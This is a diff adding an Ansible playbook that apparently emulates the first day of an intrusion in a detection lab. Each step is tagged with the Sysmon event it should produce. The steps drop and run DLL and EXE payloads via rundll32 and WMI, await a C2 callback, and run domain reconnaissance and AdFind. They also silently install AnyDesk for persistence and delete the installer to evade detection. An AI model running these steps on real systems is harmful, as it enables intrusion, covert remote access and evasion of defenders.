@@ -1,0 +1,119 @@
+---
+# ansible/attack_day1.yml
+# Day 1 - Initial access, C2, discovery, RDP, AnyDesk, AdFind
+
+- name: "Day 1 - BEACHHEAD-PC: payload drop + execution"
+  hosts: BEACHHEAD-PC
+  vars:
+    tools_dir: "{{ playbook_dir }}/../payloads/tools"
+    ps1_dir:   "{{ playbook_dir }}/../payloads/ps1"
+
+  tasks:
+    - name: "KILL - stop running payloads from previous run"
+      ansible.windows.win_shell: |
+        Stop-Process -Name "wab" -Force -ErrorAction SilentlyContinue
+        Stop-Process -Name "rundll32" -Force -ErrorAction SilentlyContinue
+        Start-Sleep -Seconds 2
+      ignore_errors: yes
+    - name: "CLEANUP - delete old files before fresh drop"
+      ansible.windows.win_file:
+        path: "{{ item }}"
+        state: absent
+      loop:
+#        - C:\ProgramData\namr.dll
+#        - C:\ProgramData\wab.exe
+        - C:\ProgramData\adfind_sub.ps1
+      ignore_errors: yes
+
+    - name: Drop namr.dll
+      ansible.windows.win_copy:
+        src: "{{ tools_dir }}/namr.dll"
+        dest: C:\ProgramData\namr.dll
+      ignore_errors: yes
+
+    - name: Drop wab.exe
+      ansible.windows.win_copy:
+        src: "{{ tools_dir }}/wab.exe"
+        dest: C:\ProgramData\wab.exe
+      ignore_errors: yes
+
+    - name: "TRIGGER - rundll32 executes namr.dll (Sysmon Event 1)"
+      ansible.windows.win_shell: |
+        cmd.exe /c start /b rundll32.exe C:\ProgramData\namr.dll,IternalJob
+      async: 5
+      poll: 0
+      ignore_errors: yes
+
+    - name: "TRIGGER - wab.exe via WMI (Sysmon Event 1, parent WmiPrvSE)"
+      ansible.windows.win_shell: |
+        wmic process call create 'C:\ProgramData\wab.exe'
+      ignore_errors: yes
+
+    - name: Wait for C2 callback
+      ansible.builtin.pause:
+        seconds: 20
+
+    - name: "DISCOVERY - basic host recon (Sysmon Event 1)"
+      ansible.windows.win_shell: "{{ item }}"
+      loop:
+        - whoami
+        - ipconfig /all
+        - tasklist
+        - systeminfo
+        - wmic product get name,version
+      ignore_errors: yes
+
+    - name: "DISCOVERY - domain recon"
+      ansible.windows.win_shell: |
+        powershell -nop -c "
+        net localgroup administrators 2>&1
+        nltest /dclist: 2>&1
+        nltest /domain_trusts 2>&1
+        "
+      ignore_errors: yes
+
+    - name: Drop adfind_sub.ps1
+      ansible.windows.win_copy:
+        src: "{{ ps1_dir }}/adfind_sub.ps1"
+        dest: C:\ProgramData\adfind_sub.ps1
+
+    - name: "ADFIND - first run (Sysmon Event 1)"
+      ansible.windows.win_shell: |
+        powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\adfind_sub.ps1
+      ignore_errors: yes
+
+- name: "Day 1 - YAMCHA-PC: AnyDesk persistence"
+  hosts: YAMCHA-PC
+  vars:
+    tools_dir: "{{ playbook_dir }}/../payloads/tools"
+
+  tasks:
+
+    - name: "CLEANUP - delete old AnyDesk installer"
+      ansible.windows.win_file:
+        path: C:\ProgramData\AnyDeskInst.exe
+        state: absent
+      ignore_errors: yes
+
+    - name: Copy AnyDesk to YAMCHA-PC (Sysmon Event 11)
+      ansible.windows.win_copy:
+        src: "{{ tools_dir }}/AnyDesk.exe"
+        dest: C:\ProgramData\AnyDeskInst.exe
+      ignore_errors: yes
+
+    - name: "PERSISTENCE - install AnyDesk silently (Event 7045)"
+      ansible.windows.win_shell: |
+        Start-Process -FilePath "C:\ProgramData\AnyDeskInst.exe" `
+          -ArgumentList "--install `"C:\Program Files (x86)\AnyDesk`" --silent" `
+          -NoNewWindow -Wait
+      ignore_errors: yes
+
+    - name: Wait for AnyDesk service
+      ansible.builtin.pause:
+        seconds: 8
+
+    - name: "DEFENSE EVASION - delete AnyDesk installer (Sysmon Event 23)"
+      ansible.windows.win_file:
+        path: C:\ProgramData\AnyDeskInst.exe
+        state: absent
+      ignore_errors: yes
